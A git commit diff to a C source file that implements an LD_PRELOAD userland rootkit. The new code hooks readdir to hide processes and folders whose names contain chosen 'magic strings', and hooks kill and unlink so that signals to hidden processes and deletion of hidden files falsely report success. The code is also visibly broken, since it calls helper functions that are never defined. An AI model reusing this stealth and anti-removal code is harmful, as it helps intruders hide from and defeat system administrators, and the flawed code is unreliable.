8d4a04ffb32e6a7fbad8f252276ea9e917410f0e
killercarrot00 <136820121+killercarrot00@users.noreply.github.com>
2023-07-02 19:03:58 +0300

    Update libsysproc.c

--- libsysproc.c
+++ libsysproc.c
@@ -1,30 +1,32 @@
 #define _GNU_SOURCE
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 #include <dirent.h>
 #include <dlfcn.h>
+#include <signal.h>
 #include <unistd.h>
 
-// Define the magic strings to hide processes, folders, files, and CPU usage
+// Define the magic strings to hide processes and folders
 const char* magic_string1 = "my_magic_string1";
 const char* magic_string2 = "my_magic_string2";
 const char* magic_string3 = "my_magic_string3";
 
 // Function pointers to the original library functions
 typedef struct dirent* (*readdir_t)(DIR*);
-typedef int (*readdir_r_t)(DIR*, struct dirent*, struct dirent**);
-typedef int (*stat_t)(const char*, struct stat*);
+typedef int (*kill_t)(pid_t, int);
+typedef int (*unlink_t)(const char *);
 
-// Function to hide processes, folders, and files
+// Function to hide processes and folders
 struct dirent* readdir(DIR* dirp) {
     readdir_t original_readdir;
     original_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");
 
     struct dirent* entry;
     while ((entry = original_readdir(dirp)) != NULL) {
-        if (strcmp(entry->d_name, magic_string1) == 0 ||
-            strcmp(entry->d_name, magic_string2) == 0 ||
-            strcmp(entry->d_name, magic_string3) == 0) {
+        if (strstr(entry->d_name, magic_string1) != NULL ||
+            strstr(entry->d_name, magic_string2) != NULL ||
+            strstr(entry->d_name, magic_string3) != NULL) {
             entry = original_readdir(dirp);
             continue;
         }
@@ -33,33 +35,40 @@ struct dirent* readdir(DIR* dirp) {
     return NULL;
 }
 
-// Function to hide CPU usage
-int readdir_r(DIR* dirp, struct dirent* entry, struct dirent** result) {
-    readdir_r_t original_readdir_r;
-    original_readdir_r = (readdir_r_t)dlsym(RTLD_NEXT, "readdir_r");
+// Function to prevent process termination
+int kill(pid_t pid, int sig) {
+    kill_t original_kill;
+    original_kill = (kill_t)dlsym(RTLD_NEXT, "kill");
 
-    int ret;
-    while ((ret = original_readdir_r(dirp, entry, result)) == 0) {
-        if (*result == NULL)
-            break;
-        if (strcmp((*result)->d_name, magic_string1) == 0 ||
-            strcmp((*result)->d_name, magic_string2) == 0 ||
-            strcmp((*result)->d_name, magic_string3) == 0)
-            continue;
-        return 0;
+    if (is_process_hidden(pid)) {
+        return 0;  // Return success to pretend the process was killed
     }
-    return ret;
+
+    return original_kill(pid, sig);
 }
 
-// Function to hide file access
-int stat(const char* path, struct stat* buf) {
-    stat_t original_stat;
-    original_stat = (stat_t)dlsym(RTLD_NEXT, "stat");
+// Function to prevent file deletion
+int unlink(const char *pathname) {
+    unlink_t original_unlink;
+    original_unlink = (unlink_t)dlsym(RTLD_NEXT, "unlink");
 
-    if (strcmp(path, magic_string1) == 0 ||
-        strcmp(path, magic_string2) == 0 ||
-        strcmp(path, magic_string3) == 0)
-        return -ENOENT; // Return "No such file or directory" error
+    if (is_file_hidden(pathname)) {
+        return 0;  // Return success to pretend the file was deleted
+    }
 
-    return original_stat(path, buf);
+    return original_unlink(pathname);
+}
+
+// Function to check if a process or file should be hidden
+int is_hidden(const char* name) {
+    // Implement your logic here to determine if the process or file should be hidden
+    // You can use the magic strings or any other criteria to make the decision
+    // Return 1 if the process or file should be hidden, otherwise return 0
+
+    if (strstr(name, magic_string1) != NULL ||
+        strstr(name, magic_string2) != NULL ||
+        strstr(name, magic_string3) != NULL) {
+        return 1;
+    }
+    return 0;
 }
